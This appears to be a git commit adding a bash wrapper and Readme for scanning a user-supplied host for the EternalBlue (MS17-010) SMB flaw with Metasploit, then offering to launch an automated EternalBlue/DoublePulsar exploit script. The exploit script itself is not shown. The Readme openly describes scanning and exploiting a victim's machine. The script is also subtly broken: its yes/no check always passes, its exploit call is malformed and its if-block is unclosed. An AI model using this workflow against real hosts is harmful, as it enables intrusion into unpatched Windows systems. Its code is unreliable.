1547c6b468b09216a367bf8be2e778747439ab65
zertmark <47692978+zertmark@users.noreply.github.com>
2019-02-16 17:05:24 +0300

    Add files via upload

---
+++ Eternalblue scanner.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+echo " ▄▄        ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄       
+      ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄      
+     ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄     
+    ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄    
+   ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █▄   
+  ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄  
+ ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄ "
+
+read -p 'RHOST= ' rhost
+mkdir scan
+cd scan
+echo use auxiliary/scanner/smb/smb_ms17_010 > scan.rc
+echo "set rhosts" $rhost >> scan.rc
+echo "set CHECK_PIPE true" >> scan.rc
+echo "run" >> scan.rc
+xterm -e "msfconsole -r scan.rc"
+sleep 200
+read -p 'Launch auto eternalblue?(Y/n)' answer
+if [[ ( answer=="Y" ) || ( answer=="y" ) ]]; then
+cd ..
+eternalblue auto.sh
+else
+echo "Goodbye :)"
---
+++ Readme.md
@@ -0,0 +1,11 @@
+                 ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄       
+      ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄      
+     ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄     
+    ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄    
+   ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █▄   
+  ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄  
+ ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄ 
+///////////////////////////////////////////////Readme\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+There are some scripts which will help you in testing exploit eternalblue_doublepulsar:
+1.)"Eternalblue scanner"-scans vicim's machine for an exploit
+2.)"Eternalblue auto exploit"-exploits vicim's machine
